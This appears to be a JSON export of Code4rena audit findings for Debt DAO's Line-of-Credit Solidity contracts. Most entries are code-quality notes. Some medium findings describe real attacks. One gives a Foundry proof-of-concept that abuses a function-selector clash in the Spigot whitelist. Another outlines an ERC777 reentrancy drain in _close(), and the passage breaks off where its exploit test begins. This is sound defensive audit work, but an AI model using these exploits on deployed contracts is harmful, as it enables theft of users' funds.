      "content": "\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L1\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n2:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42959",
      "title": "[N-12]  Inconsistent spacing in comments",
      "impact": "LOW",
      "content": "\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n58:           deadline = block.timestamp + ttl_;  //the deadline is the term/maturity/expiry date of the Line of Credit facility\n\n526:                    credits[id].principal > 0 //`id` should be placed before `p` \n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L58\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42958",
      "title": "[N-11]  Constant redefined elsewhere",
      "impact": "LOW",
      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n27:       address public immutable oracle;\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n29:       address public immutable borrower;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L27\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n16:       address public immutable arbiter;\n\n/// @audit seen in contracts/modules/escrow/Escrow.sol \n17:       address public immutable oracle;\n\n/// @audit seen in contracts/modules/credit/SpigotedLine.sol \n18:       address public immutable swapTarget;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42957",
      "title": "[N-10]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)",
      "impact": "LOW",
      "content": "\nWhile the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n42:           uint256 _numerator = collateralValue * 10**5; // scale to 4 decimals\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42956",
      "title": "[N-09]  Use a more recent version of Solidity",
      "impact": "LOW",
      "content": "\nUse a Solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L1\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L1\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L1\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L1\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42955",
      "title": "[N-08]  Use a more recent version of Solidity",
      "impact": "LOW",
      "content": "\nUse a Solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n3:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L3\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42954",
      "title": "[N-07]  Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "\nThere are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit 3000\n14:       uint32 constant defaultMinCRatio = 3000; // 30.00% minimum collateral ratio\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L14\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42953",
      "title": "[N-06]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "\nEven [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 7 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit 18\n140:            decimals = 18;\n\n/// @audit 18\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit 5\n42:           uint256 _numerator = collateralValue * 10**5; // scale to 4 decimals\n\n/// @audit 5\n43:           return ((_numerator / debtValue) + 5) / 10;\n\n/// @audit 18\n113:                  deposit.assetDecimals = 18;\n\n/// @audit 18\n137:                      deposit.assetDecimals = 18;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit 100\n90:           uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L90\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42952",
      "title": "[N-05]  `require()`/`revert()` statements should have descriptive reason strings",
      "impact": "LOW",
      "content": "\n*There are 23 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n64:       require(escrow_.liquidate(amount, targetToken, to));\n\n90:       require(escrow.updateLine(newLine));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L64\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n112:          require(uint(status) >= uint( LineLib.STATUS.ACTIVE));\n\n241:          require(interestRate.setRate(id, drate, frate));\n\n259:          require(interestRate.setRate(id, drate, frate));\n\n326:          require(amount <= credit.principal + credit.interestAccrued);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L112\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n62:           require(defaultRevenueSplit_ <= SpigotedLineLib.MAX_SPLIT);\n\n143:        require(amount <= unusedTokens[credit.token]);\n\n160:          require(msg.sender == borrower);\n\n239:          require(msg.sender == arbiter);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L62\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n91:           require(amount > 0);\n\n105:          require(msg.sender == ILineOfCredit(self.line).arbiter());\n\n161:          require(amount > 0);\n\n198:          require(amount > 0);\n\n216:        require(msg.sender == self.line);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n147:        require(ISpigot(spigot).updateOwner(newLine));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L147\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n96:               require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n\n128:          require(revenueContract != address(this));\n\n130:          require(self.settings[revenueContract].transferOwnerFunction == bytes4(0));\n\n155:          require(success);\n\n180:          require(newOwner != address(0));\n\n189:          require(newOperator != address(0));\n\n201:          require(newTreasury != address(0));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42951",
      "title": "[N-04]  Adding a `return` statement when the function defines a named return variable, is redundant",
      "impact": "LOW",
      "content": "\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n453:          return id;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L453\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n160:        return credit;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L160\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n57:           return claimed;\n\n101:          return claimed;\n\n121:          return claimed;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L57\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42950",
      "title": "[N-03]  Contract implements interface without extending the interface",
      "impact": "LOW",
      "content": "\nNot extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit IPendleData.treasury()\n16:   contract Spigot is ISpigot, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42949",
      "title": "[N-02]  The `nonReentrant` `modifier` should occur before all other modifiers",
      "impact": "LOW",
      "content": "\nThis is a best-practice to protect against reentrancy in other modifiers.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n96:           nonReentrant\n\n157:          nonReentrant\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42948",
      "title": "[N-01]  Duplicate import statements",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n6:    import { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L6\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42947",
      "title": "[L-03]  Open TODOs",
      "impact": "LOW",
      "content": "\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n140:          // TODO: test\n\n145:          // TODO: test\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L140\n\n\n## Non-Critical Issues Summary\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;01] | Duplicate import statements | 1 |\n| [N&#x2011;02] | The `nonReentrant` `modifier` should occur before all other modifiers | 2 |\n| [N&#x2011;03] | Contract implements interface without extending the interface | 1 |\n| [N&#x2011;04] | Adding a `return` statement when the function defines a named return variable, is redundant | 5 |\n| [N&#x2011;05] | `require()`/`revert()` statements should have descriptive reason strings | 23 |\n| [N&#x2011;06] | `constant`s should be defined rather than using magic numbers | 7 |\n| [N&#x2011;07] | Numeric values having to do with time should use time units for readability | 1 |\n| [N&#x2011;08] | Use a more recent version of solidity | 1 |\n| [N&#x2011;09] | Use a more recent version of solidity | 6 |\n| [N&#x2011;10] | Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`) | 1 |\n| [N&#x2011;11] | Constant redefined elsewhere | 5 |\n| [N&#x2011;12] | Inconsistent spacing in comments | 2 |\n| [N&#x2011;13] | Non-library/interface files should use fixed compiler versions, not floating ones | 5 |\n| [N&#x2011;14] | File does not contain an SPDX Identifier | 16 |\n| [N&#x2011;15] | NatSpec is incomplete | 56 |\n| [N&#x2011;16] | Event is missing `indexed` fields | 4 |\n| [N&#x2011;17] | Not using the named return variables anywhere in the function is confusing | 2 |\n| [N&#x2011;18] | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 2 |\n\nTotal: 140 instances over 18 issues\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42946",
      "title": "[L-02]  Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n56:           arbiter = arbiter_;\n\n57:           borrower = borrower_;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L56\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n66:           swapTarget = swapTarget_;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L66\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n49:           oracle = _oracle;\n\n50:           borrower = _borrower;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L49\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42945",
      "title": "[L-01]  Unused/empty `receive()`/`fallback()` function",
      "impact": "LOW",
      "content": "\nIf the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n272:      receive() external payable {}\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L272\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42944",
      "title": "[M-10] `address.call{value:x}()` should be used instead of `payable.transfer()`",
      "impact": "MEDIUM",
      "content": "\nWhen withdrawing and refund  ETH, the  contract uses Solidity’s `transfer()` function.\n\nUsing Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when:\n\n*   The withdrawer smart contract does not implement a payable fallback function.\n*   The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.\n*   The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.\n\nRisks of reentrancy stemming from the use of this function can be mitigated by tightly following the \"Check-Effects-Interactions\" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract. \n\n### Proof of Concept\n\n```solidity\n// Line-of-Credit/contracts/utils/LineLib.sol\n48:    payable(receiver).transfer(amount);\n```\n\n#### References:\n\nThe issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/).\n\nFor further reference on why using Solidity’s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).\n\n### Recommended Mitigation Steps\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/369#issuecomment-1405078680)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with using Solidity's `transfer()` function when withdrawing and refunding ETH. This function has some limitations when used by a smart contract, which can make it impossible to withdraw ETH deposits. This can happen if the smart contract does not have a specific function, uses too much gas, or is called through a proxy that increases gas usage. To mitigate the risks of this function, it is recommended to use the \"Check-Effects-Interactions\" pattern and the ReentrancyGuard contract from OpenZeppelin. The report also includes a proof of concept and references for further reading on the issue. It is advised to use low-level `call.value(amount)` or the OpenZeppelin `Address.sendValue` instead of `transfer()`. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/369",
      "tags": [],
      "finders": [
        "codexploder",
        "Ch\\_301",
        "Nyx",
        "cryptonue",
        "Bnke0x0",
        "peanuts",
        "pashov",
        "minhquanym",
        "joestakey",
        "KingNFT",
        "Amithuddar",
        "adriro",
        "Tomo",
        "d3e4",
        "IllIllI",
        "Deivitto",
        "cccz",
        "RaymondFam",
        "corerouter",
        "0xdeadbeef0x",
        "cloudjunky",
        "SmartSek",
        "8olidity",
        "datapunk",
        "martin",
        "Satyam\\_Sharma",
        "RedOneN",
        "\\_\\_141345\\_\\_",
        "carlitox477",
        "merlin",
        "rvierdiiev",
        "bananasboys"
      ]
    },
    {
      "id": "42943",
      "title": "[M-07] Whitelisted functions aren't scoped to revenue contracts and may lead to unnoticed calls due to selector clashing",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14>\n\nWhitelisted functions in the Spigot contract don't have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).\n\n### Impact\n\nFunctions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.\n\nIn this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract.\n\nMining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.\n\nThis is similar to the attack found on proxies, documented [here](https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357) and [here](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070).\n\n### Proof of Concept\n\nIn the following test, the `collate_propagate_storage(bytes16)` function is whitelisted because it looks safe enough to the arbiter. Now, `collate_propagate_storage(bytes16)` has the same selector as `burn(uint256)`, which allows a bad actor to call `EvilRevenueContract.burn` using the `operate` function of the Spigot.\n\nNote: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.\n\n    contract InnocentRevenueContract {\n        function collate_propagate_storage(bytes16) external {\n            // It's all safe here!\n            console.log(\"Hey it's all good here\");\n        }\n    }\n\n    contract EvilRevenueContract {\n        function burn(uint256) external {\n            // Burn the world!\n            console.log(\"Boom!\");\n        }\n    }\n\n    function test_WhitelistFunction_SelectorClash() public {\n          vm.startPrank(owner);\n          \n          spigot = new Spigot(owner, treasury, operator);\n          \n          // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it's safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)\n          spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);\n          assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));\n          \n          // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!\n          assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));\n          \n          \n          EvilRevenueContract evil = new EvilRevenueContract();\n          // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);\n          // require(spigot.addSpigot(address(evil), settings), \"Failed to add spigot\");\n          \n          vm.stopPrank();\n                  \n          // And we can call it through operate...\n          vm.startPrank(operator);\n          spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));\n      }\n\n### Recommendation\n\nAssociate whitelisted functions to particular revenue contracts (for example, using a `mapping(address => mapping(bytes4 => bool))`) and validate that the selector for the call is enabled for that specific revenue contract in the `operate` function.\n\n**[dmvt (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312)**\n\n**[kibagateaux (Debt DAO) acknowledged](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312#issuecomment-1405075722)**\n\n\n\n***\n\n",
      "summary": "\nThe Spigot contract has a bug where whitelisted functions are not associated or validated to a specific revenue contract, which can potentially lead to a bad actor calling a malicious function through a seemingly innocent function. This is similar to a previous attack found on proxies. A proof of concept test is provided to demonstrate the bug. The recommendation is to associate whitelisted functions with specific revenue contracts and validate the selector in the `operate` function. The severity of this bug has been decreased to Medium and has been acknowledged by the Debt DAO team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/312",
      "tags": [],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "Ruhum",
        "berndartmueller",
        "adriro",
        "rvierdiiev"
      ]
    },
    {
      "id": "42942",
      "title": "[M-06] The lender can draw out extra credit token from borrower's account",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488>\n\n### Impact\n\nWhen the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the `count` state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.\n\nP.S.\n\n[Similar attack on imBTC](https://zengo.com/imbtc-defi-hack-explained)\n\n### Proof of Concept\n\nThe vulnerable point is in `\\_close()` function,\n\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        // ...\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n        // ...\n    }\n\nThe following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass\n\n```\npragma solidity 0.8.9;\n\nimport 